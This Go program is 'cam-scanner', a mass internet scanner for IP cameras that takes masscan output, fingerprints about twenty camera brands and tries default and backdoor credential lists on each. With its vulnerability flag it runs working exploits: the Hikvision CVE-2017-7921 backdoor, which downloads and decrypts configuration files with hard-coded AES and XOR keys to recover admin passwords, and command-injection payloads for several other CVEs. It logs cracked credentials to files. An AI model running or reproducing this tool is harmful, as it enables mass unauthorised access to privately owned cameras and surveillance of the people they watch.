package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/netip"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	version     = "1.0"
	maxBodySize = 32 * 1024
	maxWorkers  = 50000
)

func printStatus(started time.Time) {
	t := testedCount.Load()
	f := foundCount.Load()
	a := authedCount.Load()
	i := targetsIn.Load()
	v := vulnCount.Load()
	e := excludedCount.Load()
	elapsed := time.Since(started).Seconds()
	if elapsed < 0.001 {
		elapsed = 0.001
	}
	rate := float64(t) / elapsed
	if vulnRun {
		fmt.Fprintf(os.Stderr, "\r\033[K[status] %d in | %d tested | %d cameras | %d authed | %d vuln | %d excluded | %.0f/s | %.1fs",
			i, t, f, a, v, e, rate, elapsed)
	} else {
		fmt.Fprintf(os.Stderr, "\r\033[K[status] %d in | %d tested | %d cameras | %d authed | %d excluded | %.0f/s | %.1fs",
			i, t, f, a, e, rate, elapsed)
	}
}

type result struct {
	target   string
	brand    string
	creds    string
	gotCreds bool
	vulns    string
}

type fingerprintRule struct {
	brand      string
	serverKeys []string
	bodyKeys   []string
	matchReq   string
	creds      [][2]string
}

var fingerprinter = []fingerprintRule{
	// Hikvision family — match requires or-match
	{
		brand:      "hikvision",
		serverKeys: []string{"dnvrs-webs", "webserver", "goahead-webs"},
		bodyKeys:   []string{"hikvision", "web version:", "hikvision ip camera"},
		matchReq:   "any",
		creds:      [][2]string{{"admin", "12345"}, {"admin", "admin"}, {"admin", "123456"}, {"ilv2", "ilv29960"}, {"ada", "ilv29960"}, {"gold", "ilv29960"}, {"Hikbackup", "vipcam8419"}, {"admin", "12345678a"}},
	},
	{
		brand:      "hilook",
		serverKeys: []string{"dnvrs-webs", "webserver"},
		bodyKeys:   []string{"hilook"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "12345"}, {"admin", "admin"}},
	},
	{
		brand:      "hiwatch",
		serverKeys: []string{"dnvrs-webs", "webserver"},
		bodyKeys:   []string{"hiwatch"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "12345"}, {"admin", "admin"}},
	},
	// Dahua family
	{
		brand:      "dahua",
		serverKeys: []string{"dvrdvr-webs", "webmind"},
		bodyKeys:   []string{"dahua", "dahuatech", "webmind"},
		matchReq:   "any",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "amcrest",
		serverKeys: []string{"dvrdvr-webs", "webmind"},
		bodyKeys:   []string{"amcrest"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "lorex",
		serverKeys: []string{"dvrdvr-webs", "webmind"},
		bodyKeys:   []string{"lorex"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "qsee",
		serverKeys: []string{"dvrdvr-webs", "webmind"},
		bodyKeys:   []string{"q-see", "qsee"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}, {"admin", "123456"}},
	},
	// Major standalone brands
	{
		brand:      "axis",
		serverKeys: []string{"axis"},
		bodyKeys:   []string{"axis", "axis communications"},
		matchReq:   "any",
		creds:      [][2]string{{"root", "pass"}},
	},
	{
		brand:      "panasonic",
		serverKeys: []string{"panasonic", "i-pro"},
		bodyKeys:   []string{"panasonic", "i-pro", "network camera"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "12345"}},
	},
	{
		brand:      "foscam",
		serverKeys: []string{"foscam"},
		bodyKeys:   []string{"foscam"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", ""}},
	},
	{
		brand:      "reolink",
		serverKeys: []string{"reolink"},
		bodyKeys:   []string{"reolink"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", ""}},
	},
	{
		brand:      "samsung",
		serverKeys: []string{"samsung"},
		bodyKeys:   []string{"samsung", "samsung electronics"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "4321"}, {"root", "root"}},
	},
	{
		brand:      "sony",
		serverKeys: []string{"sony"},
		bodyKeys:   []string{"sony", "sony network camera"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "swann",
		serverKeys: []string{"swann"},
		bodyKeys:   []string{"swann"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "12345"}},
	},
	{
		brand:      "uniview",
		serverKeys: []string{"uniview"},
		bodyKeys:   []string{"uniview"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "123456"}},
	},
	{
		brand:      "ubiquiti",
		serverKeys: []string{"ubiquiti", "nginx"},
		bodyKeys:   []string{"ubiquiti", "unifi", "aircam"},
		matchReq:   "both",
		creds:      [][2]string{{"ubnt", "ubnt"}},
	},
	{
		brand:      "vivotek",
		serverKeys: []string{"vivotek", "vvtk"},
		bodyKeys:   []string{"vivotek", "network camera"},
		matchReq:   "both",
		creds:      [][2]string{{"root", ""}, {"root", "root"}},
	},
	{
		brand:      "tplink",
		serverKeys: []string{"tapo", "tp-link", "tp-link tapo"},
		bodyKeys:   []string{"tapo", "tp-link"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "dlink",
		serverKeys: []string{"micro_httpd", "alpha_httpd"},
		bodyKeys:   []string{"dcs-", "d-link", "mydlink"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "acti",
		serverKeys: []string{"acti"},
		bodyKeys:   []string{"acti"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "123456"}, {"Admin", "123456"}},
	},
	{
		brand:      "geovision",
		serverKeys: []string{"geovision"},
		bodyKeys:   []string{"geovision"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	{
		brand:      "grandstream",
		serverKeys: []string{"grandstream"},
		bodyKeys:   []string{"grandstream"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}},
	},
	// Catch-all for unknown camera-like devices
	{
		brand:      "generic-camera",
		serverKeys: []string{"goahead-webs", "rompager", "thttpd", "boa", "mini_httpd", "micro_httpd"},
		bodyKeys:   []string{"camera", "login", "onvif"},
		matchReq:   "both",
		creds:      [][2]string{{"admin", "admin"}, {"admin", "12345"}, {"root", "root"}},
	},
}

var (
	targetsIn        atomic.Int64
	testedCount      atomic.Int64
	foundCount       atomic.Int64
	authedCount      atomic.Int64
	vulnCount        atomic.Int64
	excludedCount    atomic.Int64
	statusQuiet      bool
	vulnRun          bool
	versionsOut      string
	excludedPrefixes []netip.Prefix
	versionMu        sync.Mutex
	versionCounts    map[string]map[string]int
)

type probeResult struct {
	status int
	header http.Header
	body   string
}

func basicAuth(user, pass string) string {
	return base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
}

func hasAny(s string, keys []string) bool {
	s = strings.ToLower(s)
	for _, k := range keys {
		if strings.Contains(s, k) {
			return true
		}
	}
	return false
}

func doHTTP(host string, port int, path string, auth string, timeout time.Duration, forceTLS bool) (*probeResult, error) {
	return doHTTPReq("GET", host, port, path, auth, "", "", timeout, forceTLS)
}

func doHTTPReq(method, host string, port int, path string, auth string, reqBody string, contentType string, timeout time.Duration, forceTLS bool) (*probeResult, error) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	useTLS := forceTLS || port == 443

	raw, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	if useTLS {
		tlsConn := tls.Client(raw, &tls.Config{InsecureSkipVerify: true})
		if err := tlsConn.SetDeadline(time.Now().Add(timeout)); err != nil {
			raw.Close()
			return nil, err
		}
		if err := tlsConn.Handshake(); err != nil {
			raw.Close()
			return nil, err
		}
		conn = tlsConn
	} else {
		conn = raw
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	req := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: cam-scanner/%s\r\nConnection: close\r\n", method, path, addr, version)
	if auth != "" {
		req += fmt.Sprintf("Authorization: Basic %s\r\n", auth)
	}
	if reqBody != "" {
		ct := contentType
		if ct == "" {
			ct = "application/x-www-form-urlencoded; charset=UTF-8"
		}
		req += fmt.Sprintf("Content-Type: %s\r\n", ct)
		req += fmt.Sprintf("Content-Length: %d\r\n", len(reqBody))
	}
	req += "\r\n"

	if _, err := conn.Write([]byte(req)); err != nil {
		return nil, err
	}
	if reqBody != "" {
		if _, err := conn.Write([]byte(reqBody)); err != nil {
			return nil, err
		}
	}

	resp, err := http.ReadResponse(bufio.NewReaderSize(conn, 4096), nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	if resp.StatusCode == 401 && len(body) == 0 {
		body = []byte("401 Unauthorized")
	}

	return &probeResult{
		status: resp.StatusCode,
		header: resp.Header,
		body:   string(body),
	}, nil
}

func fingerprint(status int, header http.Header, body string) (string, bool) {
	bodyLower := strings.ToLower(body)
	server := strings.ToLower(header.Get("Server"))

	for _, rule := range fingerprinter {
		hasSrv := hasAny(server, rule.serverKeys)
		hasBody := hasAny(bodyLower, rule.bodyKeys)

		if rule.matchReq == "any" && (hasSrv || hasBody) {
			return rule.brand, true
		}
		if rule.matchReq == "both" && hasSrv && hasBody {
			return rule.brand, true
		}
	}
	return "", false
}

func tryCreds(brand, host string, port int, timeout time.Duration, forceTLS bool, noAuthStatus int, noAuthBody string) (string, bool) {
	for _, rule := range fingerprinter {
		if rule.brand != brand {
			continue
		}
		for _, pair := range rule.creds {
			auth := basicAuth(pair[0], pair[1])

			if brand == "hikvision" {
				resp, err := doHTTP(host, port, "/ISAPI/Security/userCheck", auth, timeout, forceTLS)
				if err != nil {
					continue
				}
				if resp.status == 200 && strings.Contains(resp.body, "<statusValue>200</statusValue>") {
					return fmt.Sprintf("%s:%s", pair[0], pair[1]), true
				}
			} else {
				resp, err := doHTTP(host, port, "/", auth, timeout, forceTLS)
				if err != nil {
					continue
				}
				if resp.status == 200 {
					// Auth was rejected if status went 401→200
					if noAuthStatus == 401 {
						return fmt.Sprintf("%s:%s", pair[0], pair[1]), true
					}
					// Same 200 both ways: verify body changed (auth mattered)
					bodyDiff := abs(len(resp.body) - len(noAuthBody))
					if bodyDiff > len(noAuthBody)/8 {
						return fmt.Sprintf("%s:%s", pair[0], pair[1]), true
					}
				}
			}
		}
		break
	}
	return "", false
}

func abs(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

var (
	xorKey     = []byte{0x73, 0x8B, 0x55, 0x44}
	aesKey     = []byte{0x27, 0x99, 0x77, 0xf6, 0x2f, 0x6c, 0xfd, 0x2d, 0x91, 0xcd, 0x75, 0xb8, 0x89, 0xce, 0x0c, 0x9a}
	tokenRe    = regexp.MustCompile(`[A-Za-z0-9/\-:.,_$%'()[\]<> ]{2,}`)
	versionRe  = regexp.MustCompile(`(?i)(?:(?:web|firmware|software|kernel|system|product)\s*version|version[:\s]+|build[:\s#]+)\s*(\d[\w.]*(?:\s*build\s*\d+)?)`)
)

func extractVersion(body string) string {
	m := versionRe.FindStringSubmatch(body)
	if len(m) >= 2 {
		return strings.TrimSpace(m[1])
	}
	return ""
}

func extraVersion(header http.Header, body string) string {
	// Check ETag first (common in Hikvision)
	if etag := header.Get("ETag"); etag != "" {
		if strings.HasPrefix(etag, "WV-") || strings.HasPrefix(etag, "W/") {
			v := strings.TrimPrefix(etag, "WV-")
			v = strings.TrimPrefix(v, "W/\"")
			v = strings.Trim(v, "\"")
			if len(v) > 3 && v[0] >= '0' && v[0] <= '9' {
				return v
			}
		}
	}
	// Check body for version patterns
	if ver := extractVersion(body); ver != "" {
		return ver
	}
	return ""
}

func aesECBDecrypt(key, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	bs := block.BlockSize()
	out := make([]byte, len(data))
	for i := 0; i < len(data); i += bs {
		block.Decrypt(out[i:], data[i:])
	}
	return out, nil
}

func decryptConfig(data []byte) (string, string) {
	if len(data) < 16 {
		return "", ""
	}
	// Pad to 16 bytes
	if rem := len(data) % 16; rem != 0 {
		pad := make([]byte, 16-rem)
		data = append(data, pad...)
	}
	// Skip first 16 bytes (header/IV), AES-128-ECB decrypt the rest
	plain, err := aesECBDecrypt(aesKey, data[16:])
	if err != nil {
		return "", ""
	}
	// XOR with cycling key
	for i, b := range plain {
		plain[i] = b ^ xorKey[i%4]
	}
	plain = bytes.TrimRight(plain, "\x00")
	// Extract tokens
	tokens := tokenRe.FindAllString(string(plain), -1)
	lastAdmin := -1
	for i, t := range tokens {
		if t == "admin" {
			lastAdmin = i
		}
	}
	if lastAdmin >= 0 && lastAdmin+1 < len(tokens) {
		return "admin", tokens[lastAdmin+1]
	}
	return "", ""
}

func checkCVE20177921(host string, port int, timeout time.Duration, forceTLS bool) (string, string) {
	backdoorKey := "YWRtaW46MTEK"
	vuln := false

	// Check 1: /Security/users?auth=...
	resp, err := doHTTP(host, port, "/Security/users?auth="+backdoorKey, "", timeout, forceTLS)
	if err == nil && resp.status == 200 && strings.Contains(resp.body, "<userName>") {
		vuln = true
	}
	// Check 2: /onvif-http/snapshot?auth=...
	if !vuln {
		resp, err = doHTTP(host, port, "/onvif-http/snapshot?auth="+backdoorKey, "", timeout, forceTLS)
		if err == nil && resp.status == 200 && strings.HasPrefix(resp.header.Get("Content-Type"), "image") {
			vuln = true
		}
	}
	if !vuln {
		return "", ""
	}
	// Download and decrypt config
	creds := ""
	resp, err = doHTTP(host, port, "/System/configurationFile?auth="+backdoorKey, "", timeout, forceTLS)
	if err == nil && resp.status == 200 && len(resp.body) > 16 {
		u, p := decryptConfig([]byte(resp.body))
		if u != "" && p != "" {
			creds = u + ":" + p
		}
	}
	return "CVE-2017-7921", creds
}

func checkCVE202136260(host string, port int, timeout time.Duration, forceTLS bool) string {
	payload := "><?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(>webLib/cv)</language>"
	resp, err := doHTTPReq("PUT", host, port, "/SDK/webLanguage", "", payload, "", timeout, forceTLS)
	if err != nil {
		return ""
	}
	if resp.status == 200 || resp.status == 500 {
		resp, err = doHTTP(host, port, "/cv", "", timeout, forceTLS)
		if err == nil && resp.status == 200 && len(resp.body) > 0 {
			return "CVE-2021-36260"
		}
	}
	return ""
}

func checkCVE20243721(host string, port int, timeout time.Duration, forceTLS bool) string {
	path := "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%20cv47221"
	resp, err := doHTTP(host, port, path, "", timeout, forceTLS)
	if err != nil {
		return ""
	}
	if resp.status == 200 && strings.Contains(resp.body, "cv47221") {
		return "CVE-2024-3721"
	}
	return ""
}

func checkCVE202413985(host string, port int, timeout time.Duration, forceTLS bool) string {
	body := "captureCommand=;echo%20cv413985;"
	resp, err := doHTTPReq("POST", host, port, "/capture_handle.action", "", body, "", timeout, forceTLS)
	if err != nil {
		return ""
	}
	if resp.status == 200 && strings.Contains(resp.body, "cv413985") {
		return "CVE-2024-13985"
	}
	return ""
}

func checkCVE202458274(host string, port int, timeout time.Duration, forceTLS bool) string {
	payload := `{"detection":"$(echo cv458274)"}`
	resp, err := doHTTPReq("POST", host, port, "/center/api/installation/detection", "", payload, "application/json", timeout, forceTLS)
	if err != nil {
		return ""
	}
	if resp.status == 200 && strings.Contains(resp.body, "cv458274") {
		return "CVE-2024-58274"
	}
	return ""
}

func checkCVE202534043(host string, port int, timeout time.Duration, forceTLS bool) string {
	resp, err := doHTTP(host, port, "/board.cgi?cmd=echo%20cv534043", "", timeout, forceTLS)
	if err != nil {
		return ""
	}
	if resp.status == 200 && strings.Contains(resp.body, "cv534043") {
		return "CVE-2025-34043"
	}
	return ""
}

func checkCVE20236895(host string, port int, timeout time.Duration, forceTLS bool) string {
	body := "jsondata%5Btype%5D=3&jsondata%5Bip%5D=;echo%20cv36895;"
	resp, err := doHTTPReq("POST", host, port, "/php/ping.php", "", body, "", timeout, forceTLS)
	if err != nil {
		return ""
	}
	if resp.status == 200 && strings.Contains(resp.body, "cv36895") {
		return "CVE-2023-6895"
	}
	return ""
}

func loadExcludes(path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		prefix, err := netip.ParsePrefix(line)
		if err != nil {
			continue
		}
		if prefix.Addr().Is4() {
			excludedPrefixes = append(excludedPrefixes, prefix)
		}
	}
	return scanner.Err()
}

func isExcluded(host string) bool {
	addr, err := netip.ParseAddr(host)
	if err != nil {
		return false
	}
	for _, p := range excludedPrefixes {
		if p.Contains(addr) {
			return true
		}
	}
	return false
}

type outputCollector struct {
	dir       string
	results   chan *result
	done      chan struct{}
	writers   map[string]*bufio.Writer
	files     map[string]*os.File
	flushTick *time.Ticker
}

func newOutputCollector(dir string) *outputCollector {
	return &outputCollector{
		dir:       dir,
		results:   make(chan *result, 4096),
		done:      make(chan struct{}),
		writers:   make(map[string]*bufio.Writer),
		files:     make(map[string]*os.File),
		flushTick: time.NewTicker(250 * time.Millisecond),
	}
}

func (oc *outputCollector) run() {
	defer func() {
		for key, w := range oc.writers {
			w.Flush()
			oc.files[key].Close()
		}
		close(oc.done)
	}()
	for {
		select {
		case r, ok := <-oc.results:
			if !ok {
				return
			}
			suffix := "found.txt"
			if r.gotCreds {
				suffix = "good.txt"
			}
			key := r.brand + "-" + suffix

			w, ok := oc.writers[key]
			if !ok {
				os.MkdirAll(oc.dir, 0755)
				f, err := os.Create(filepath.Join(oc.dir, key))
				if err != nil {
					continue
				}
				oc.files[key] = f
				w = bufio.NewWriter(f)
				oc.writers[key] = w
			}

			line := r.target
			if r.creds != "" {
				line += " " + r.creds
			}
			w.WriteString(line + "\n")

			// Write to vulnerable.txt if vulns detected
			if r.vulns != "" {
				vkey := "vulnerable"
				vw, ok := oc.writers[vkey]
				if !ok {
					f, err := os.Create(filepath.Join(oc.dir, "vulnerable.txt"))
					if err != nil {
						continue
					}
					oc.files[vkey] = f
					vw = bufio.NewWriter(f)
					oc.writers[vkey] = vw
				}
				vw.WriteString(r.target + " " + r.vulns + "\n")
			}

		case <-oc.flushTick.C:
			for _, w := range oc.writers {
				w.Flush()
			}
		}
	}
}

func (oc *outputCollector) close() {
	close(oc.results)
	oc.flushTick.Stop()
	<-oc.done
}

func parseFlags() (string, string, int, time.Duration, bool, bool, bool, bool, int, string, string, error) {
	var (
		input       string
		outputDir   string
		threads     int
		timeoutMS   int
		port        int
		ssl         bool
		probeOnly   bool
		quiet       bool
		vuln        bool
		excludeFile string
		versions    string
	)

	defaultThreads := runtime.NumCPU() * 1024
	if defaultThreads < 1024 {
		defaultThreads = 1024
	}
	if defaultThreads > maxWorkers {
		defaultThreads = maxWorkers
	}

	flag.StringVar(&input, "i", "", "read targets from file instead of stdin")
	flag.StringVar(&input, "input", "", "read targets from file instead of stdin")
	flag.StringVar(&outputDir, "o", "cam-output", "output directory")
	flag.StringVar(&outputDir, "output-dir", "cam-output", "output directory")
	flag.IntVar(&threads, "t", defaultThreads, "concurrent checks")
	flag.IntVar(&threads, "threads", defaultThreads, "concurrent checks")
	flag.IntVar(&timeoutMS, "timeout", 3000, "per-target timeout in milliseconds")
	flag.IntVar(&port, "p", 0, "append :PORT to each IP (for zmap single-port mode)")
	flag.IntVar(&port, "port", 0, "append :PORT to each IP (for zmap single-port mode)")
	flag.BoolVar(&ssl, "ssl", false, "force HTTPS on all ports")
	flag.BoolVar(&probeOnly, "probe-only", false, "fingerprint only, do not test credentials")
	flag.BoolVar(&quiet, "q", false, "quiet mode, minimal output")
	flag.BoolVar(&quiet, "quiet", false, "quiet mode, minimal output")
	flag.BoolVar(&vuln, "vuln", false, "check for known CVEs: CVE-2017-7921, CVE-2021-36260, CVE-2023-6895, CVE-2024-3721, CVE-2024-13985, CVE-2024-58274, CVE-2025-34043")
	flag.StringVar(&excludeFile, "exclude-file", "", "file with CIDR ranges to skip")
	flag.StringVar(&excludeFile, "e", "", "file with CIDR ranges to skip")
	flag.StringVar(&versions, "versions", "", "directory to write version counts per brand")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "IP Camera Scanner v%s\n\n", version)
		fmt.Fprintf(os.Stderr, "Usage: masscan --rate=100000 -p80,81,8080,8001 <range> -oL | cam-scanner\n")
		fmt.Fprintf(os.Stderr, "       cam-scanner -i targets.txt -p80\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
	}

	if err := flag.CommandLine.Parse(os.Args[1:]); err != nil {
		return "", "", 0, 0, false, false, false, false, 0, "", "", err
	}

	if threads < 1 || threads > maxWorkers {
		return "", "", 0, 0, false, false, false, false, 0, "", "", errors.New("threads must be 1-" + strconv.Itoa(maxWorkers))
	}
	if timeoutMS < 200 || timeoutMS > 30000 {
		return "", "", 0, 0, false, false, false, false, 0, "", "", errors.New("timeout must be 200-30000 ms")
	}
	if port < 0 || port > 65535 {
		return "", "", 0, 0, false, false, false, false, 0, "", "", errors.New("port must be 0-65535")
	}

	timeout := time.Duration(timeoutMS) * time.Millisecond
	return input, outputDir, threads, timeout, ssl, probeOnly, quiet, vuln, port, excludeFile, versions, nil
}

func main() {
	input, outputDir, threads, timeout, forceTLS, probeOnly, quiet, vuln, port, excludeFile, versions, err := parseFlags()
	if err != nil {
		if err == flag.ErrHelp {
			return
		}
		fmt.Fprintf(os.Stderr, "[error] %v\n", err)
		os.Exit(1)
	}
	statusQuiet = quiet
	vulnRun = vuln
	versionsOut = versions
	if versionsOut != "" {
		versionCounts = make(map[string]map[string]int)
		os.MkdirAll(versionsOut, 0755)
	}

	if excludeFile != "" {
		if err := loadExcludes(excludeFile); err != nil {
			fmt.Fprintf(os.Stderr, "[error] loading excludes: %v\n", err)
			os.Exit(1)
		}
		fmt.Fprintf(os.Stderr, "[info] loaded %d exclude CIDRs\n", len(excludedPrefixes))
	}

	collector := newOutputCollector(outputDir)
	go collector.run()

	jobs := make(chan string, threads)
	var wg sync.WaitGroup

	started := time.Now()

	stopStatus := make(chan struct{})
	go func() {
		ticker := time.NewTicker(250 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if !statusQuiet {
					printStatus(started)
				}
			case <-stopStatus:
				return
			}
		}
	}()

	worker := func() {
		defer wg.Done()
		for target := range jobs {
			var host string
			p := port
			fields := strings.Fields(target)
			if len(fields) >= 4 && fields[0] == "open" {
				// masscan -oL format: open tcp PORT IP TIMESTAMP
				if p2, err := strconv.Atoi(fields[2]); err == nil {
					p = p2
				}
				host = fields[3]
			} else {
				// ip:port format
				parts := strings.Split(target, ":")
				host = parts[0]
				if len(parts) >= 2 {
					if p2, err := strconv.Atoi(parts[1]); err == nil {
						p = p2
					}
				}
			}

			if p <= 0 {
				continue
			}

			if len(excludedPrefixes) > 0 && isExcluded(host) {
				excludedCount.Add(1)
				continue
			}

			testedCount.Add(1)

			resp, err := doHTTP(host, p, "/", "", timeout, forceTLS)
			if err != nil {
				continue
			}

			brand, found := fingerprint(resp.status, resp.header, resp.body)
			if !found {
				continue
			}

			foundCount.Add(1)

			if versionsOut != "" {
				ver := extraVersion(resp.header, resp.body)
				if ver != "" {
					versionMu.Lock()
					m := versionCounts[brand]
					if m == nil {
						m = make(map[string]int)
						versionCounts[brand] = m
					}
					m[ver]++
					versionMu.Unlock()
				}
			}

			r := &result{
				target: fmt.Sprintf("%s:%d", host, p),
				brand:  brand,
			}

			if !probeOnly {
				if creds, ok := tryCreds(brand, host, p, timeout, forceTLS, resp.status, resp.body); ok {
					r.creds = creds
					r.gotCreds = true
					authedCount.Add(1)
				}
			}

			if vulnRun && brand == "hikvision" {
				version := extractVersion(resp.body)
				cves := ""
				configCreds := ""
				if c, creds := checkCVE20177921(host, p, timeout, forceTLS); c != "" {
					cves = c
					configCreds = creds
				}
				if c := checkCVE202136260(host, p, timeout, forceTLS); c != "" {
					if cves != "" { cves += ", " }
					cves += c
				}
				if c := checkCVE20236895(host, p, timeout, forceTLS); c != "" {
					if cves != "" { cves += ", " }
					cves += c
				}
				if c := checkCVE202458274(host, p, timeout, forceTLS); c != "" {
					if cves != "" { cves += ", " }
					cves += c
				}
				if cves != "" {
					if version != "" {
						cves = version + " | " + cves
					}
					if configCreds != "" {
						cves += " | config:" + configCreds
						if r.creds == "" {
							r.creds = configCreds
							r.gotCreds = true
							authedCount.Add(1)
						}
					}
					r.vulns = cves
					vulnCount.Add(1)
				}
			}
			if vulnRun && (brand == "dahua" || brand == "amcrest" || brand == "lorex") {
				if c := checkCVE202413985(host, p, timeout, forceTLS); c != "" {
					r.vulns = c
					vulnCount.Add(1)
				}
			}
			if vulnRun && found {
				cves := ""
				if c := checkCVE20243721(host, p, timeout, forceTLS); c != "" {
					cves = c
				}
				if c := checkCVE202534043(host, p, timeout, forceTLS); c != "" {
					if cves != "" { cves += ", " }
					cves += c
				}
				if cves != "" {
					if r.vulns != "" {
						r.vulns += ", " + cves
					} else {
						r.vulns = cves
					}
					vulnCount.Add(1)
				}
			}

			collector.results <- r
		}
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker()
	}

	readTargets := func(scanner *bufio.Scanner) {
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			targetsIn.Add(1)
			jobs <- line
		}
	}

	if input != "" {
		f, err := os.Open(input)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[error] %s\n", err)
			os.Exit(1)
		}
		scanner := bufio.NewScanner(f)
		readTargets(scanner)
		f.Close()
	} else {
		scanner := bufio.NewScanner(os.Stdin)
		readTargets(scanner)
	}

	close(jobs)
	wg.Wait()
	close(stopStatus)
	collector.close()

	if versionsOut != "" {
		versionMu.Lock()
		for brand, verMap := range versionCounts {
			if len(verMap) == 0 {
				continue
			}
			fpath := filepath.Join(versionsOut, brand+".txt")
			f, err := os.Create(fpath)
			if err != nil {
				continue
			}
			// Sort versions by count descending
			type kv struct{ k string; v int }
			var sorted []kv
			for k, v := range verMap {
				sorted = append(sorted, kv{k, v})
			}
			sort.Slice(sorted, func(i, j int) bool { return sorted[i].v > sorted[j].v })
			for _, kv := range sorted {
				fmt.Fprintf(f, "%s: %d\n", kv.k, kv.v)
			}
			f.Close()
		}
		versionMu.Unlock()
	}

	elapsed := time.Since(started)
	total := targetsIn.Load()
	tested := testedCount.Load()
	found := foundCount.Load()
	authed := authedCount.Load()
	vulns := vulnCount.Load()

	if !statusQuiet {
		printStatus(started)
		fmt.Fprint(os.Stderr, "\n")
	}
	if vulnRun {
		fmt.Printf("[done] %d targets | %d tested | %d cameras | %d authed | %d vulnerable | %.1fs\n",
			total, tested, found, authed, vulns, elapsed.Seconds())
	} else {
		fmt.Printf("[done] %d targets | %d tested | %d cameras found | %d with creds | %.1fs\n",
			total, tested, found, authed, elapsed.Seconds())
	}
}
